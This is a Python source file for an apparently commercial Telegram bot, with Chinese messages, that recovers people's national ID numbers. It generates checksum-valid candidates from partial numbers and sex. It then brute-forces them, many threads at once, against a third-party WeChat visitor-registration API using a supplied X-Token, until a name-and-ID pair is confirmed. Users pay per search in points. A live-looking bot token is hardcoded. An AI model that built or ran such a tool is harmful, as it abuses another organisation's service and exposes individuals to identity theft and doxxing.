import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 核心配置 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'

bot = telebot.TeleBot(API_TOKEN)
user_states = {} 
generated_cache = {} 

# --- 数据加载 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." # 默认初始
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_pts():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def save_tk(tk):
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f: f.write(tk)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 核心核验逻辑 ---
def run_verify_task(chat_id, msg_id, name, ids, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(ids), 0
    success_match = None
    is_running = True

    def update_ui():
        nonlocal done
        last_val = -1
        while is_running:
            if done != last_val:
                bar_len = 16
                filled = int(bar_len * done // total) if total > 0 else 0
                bar = "█" * filled + "░" * (bar_len - filled)
                percent = int(done / total * 100) if total > 0 else 0
                try:
                    bot.edit_message_text(f"⌛ **核验中...**\n`[{bar}] {done}/{total} {percent}%`" , chat_id, msg_id, parse_mode='Markdown')
                except: pass
                last_val = done
            time.sleep(2)

    threading.Thread(target=update_ui, daemon=True).start()

    def check(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type":"id_card","mobile":"15555555555","id_no":id_no,"name":name}
            res = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5).json()
            if res.get("code") == 0:
                success_match = f"✨ **发现成功匹配：**\n{name} `{id_no}` 二要素验证成功✅\n💰 **剩余积分:** {user_points.get(uid, 0)}"
                is_running = False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as ex:
        ex.map(check, ids)
    
    is_running = False
    if success_match:
        bot.send_message(chat_id, success_match, parse_mode='Markdown')
    else:
        bot.edit_message_text("❌ 核验完成，未发现匹配结果。", chat_id, msg_id)

# ================= 业务指令 =================

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/'))
def cmd_router(m):
    uid = m.from_user.id
    user_states.pop(m.chat.id, None) # 强制重置状态
    
    text = m.text.strip()
    if text.startswith('/start'):
        pts = user_points.get(uid, 0)
        bot.send_message(m.chat.id, f"👋 **核验模式**\n💰 积分: {pts}\n💸 费用: 100/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入姓名:")
        user_states[m.chat.id] = {'step': 'v_name'}
        
    elif text.startswith('/gen'):
        pts = user_points.get(uid, 0)
        bot.send_message(m.chat.id, f"🛠 **生成模式**\n💰 积分: {pts}\n💸 费用: 50/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入补全号(x表示未知):")
        user_states[m.chat.id] = {'step': 'g_card'}

    elif text.startswith('/add'):
        if uid != ADMIN_ID: return
        try:
            _, tid, amt = text.split()
            user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
            save_pts()
            bot.reply_to(m, f"✅ 充值成功！余额: `{user_points[int(tid)]}`")
        except: bot.reply_to(m, "格式: /add ID 100")

    elif text.startswith('/set_token'):
        if uid != ADMIN_ID: return
        bot.reply_to(m, "🗝 请发送新的 X-Token:")
        user_states[m.chat.id] = {'step': 'set_tk'}

# ================= 逻辑处理 =================

@bot.message_handler(func=lambda m: m.chat.id in user_states)
def logic_handler(m):
    uid = m.from_user.id
    state = user_states[m.chat.id]
    text = m.text.strip()

    if state['step'] == 'set_tk':
        global CURRENT_X_TOKEN
        CURRENT_X_TOKEN = text
        save_tk(text)
        bot.reply_to(m, "✅ Token 已更新生效")
        user_states.pop(m.chat.id)

    elif state['step'] == 'v_name':
        user_states[m.chat.id] = {'step': 'v_ids', 'name': text}
        bot.send_message(m.chat.id, "请发送要核验的身份证列表:")

    elif state['step'] == 'v_ids':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(m, "❌ 积分不足(100)"); return
        v_ids = re.findall(r'\d{17}[\dXx]', text)
        if v_ids:
            user_points[uid] -= 100; save_pts()
            msg = bot.send_message(m.chat.id, "⌛ 准备开始...")
            threading.Thread(target=run_verify_task, args=(m.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        user_states.pop(m.chat.id)

    elif state['step'] == 'g_card':
        user_states[m.chat.id] = {'step': 'g_sex', 'card': text.lower()}
        bot.send_message(m.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.reply_to(m, "❌ 积分不足(50)"); return
        bot.send_message(m.chat.id, "⌛ 正在补全...")
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
        ids = [num for res in itertools.product(*char_sets) if is_valid_id(num := "".join(res))][:5000]
        if ids:
            user_points[uid] -= 50; save_pts()
            generated_cache[uid] = ids
            with open("铭.txt", "w") as f: f.write("\n".join(ids))
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🚀 立即核验 (100积分)", callback_data="start_v"))
            bot.send_document(m.chat.id, open("铭.txt", "rb"), caption=f"✅ 生成成功！余额: {user_points[uid]}", reply_markup=markup)
        user_states.pop(m.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "start_v")
def call_v(call):
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_gen_name'}

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'v_gen_name')
def logic_v_gen(m):
    uid = m.from_user.id
    if user_points.get(uid, 0) < 100: bot.reply_to(m, "❌ 积分不足"); return
    user_points[uid] -= 100; save_pts()
    msg = bot.send_message(m.chat.id, "⌛ 准备开始...")
    threading.Thread(target=run_verify_task, args=(m.chat.id, msg.message_id, m.text.strip(), generated_cache.get(uid, []), uid)).start()
    user_states.pop(m.chat.id)

if __name__ == '__main__':
    print(">>> 系统已就绪，等待指令...")
    bot.infinity_polling()
